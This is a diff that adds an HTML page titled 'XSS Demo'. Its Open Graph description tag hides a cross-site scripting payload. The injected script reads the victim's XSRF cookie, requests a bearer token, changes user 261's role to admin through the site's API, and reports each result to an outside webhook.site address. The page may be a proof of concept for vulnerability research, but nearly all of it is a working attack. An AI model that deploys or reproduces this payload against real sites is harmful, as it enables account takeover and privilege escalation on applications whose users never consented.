@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>XSS Demo</title>
+        <meta property="og:title" content="Exploit" />
+        <meta
+            property="og:description"
+            content='
+        <script>
+           (async function () {
+    const WEBHOOK_URL =
+        "https://webhook.site/6923b4ad-4ea0-46f6-aa5b-ff725f01598e";
+
+    // Send data to webhook
+    function logToWebhook(data) {
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: data ? JSON.stringify(data) : null,
+        });
+    }
+
+    // Get XSRF token from cookies
+    function getXsrfToken() {
+        try {
+            return decodeURIComponent(
+                document.cookie
+                    .split("; ")
+                    .find((cookie) => cookie.startsWith("XSRF-TOKEN="))
+                    .split("=")[1]
+            );
+        } catch {
+            return null;
+        }
+    }
+
+    // Main execution
+    try {
+        const xsrfToken = getXsrfToken();
+
+        if (!xsrfToken) {
+            logToWebhook({ error: "XSRF token not found" });
+            return;
+        }
+
+        // Request 1: Get bearer token
+        const tokenResponse = await fetch("/generate-token", {
+            method: "POST",
+            headers: {
+                "X-XSRF-TOKEN": xsrfToken,
+                "X-Requested-With": "XMLHttpRequest",
+            },
+            credentials: "include",
+        });
+
+        const tokenData = await tokenResponse.json();
+        const bearerToken = tokenData.token;
+
+        // Request 2: Change user role
+        const formData = {
+            name: "Hacker",
+            email: "hacker@example.com",
+            role: "admin",
+        };
+        const updateResponse = await fetch("/api/admin/users/261", {
+            method: "PUT",
+            headers: {
+                "Content-Type": "application/json",
+                Authorization: `Bearer ${bearerToken}`,
+                Accept: "application/json",
+            },
+            credentials: "include",
+            body: JSON.stringify(formData),
+        });
+        const updateData = await updateResponse.json();
+        if (updateResponse.ok) {
+            logToWebhook({
+                message: "User role updated successfully",
+                data: updateData,
+            });
+        } else {
+            logToWebhook({
+                error: "Failed to update user role",
+                details: updateData,
+            });
+        }
+    } catch (error) {
+        logToWebhook({ error: error.message });
+    }
+})();
+        </script>
+        '
+        />
+        <meta property="og:image" content="https://example.com/image.jpg" />
+        <meta
+            property="og:url"
+            content="https://username.github.io/repo-name/"
+        />
+    </head>
+    <body></body>
+</html>
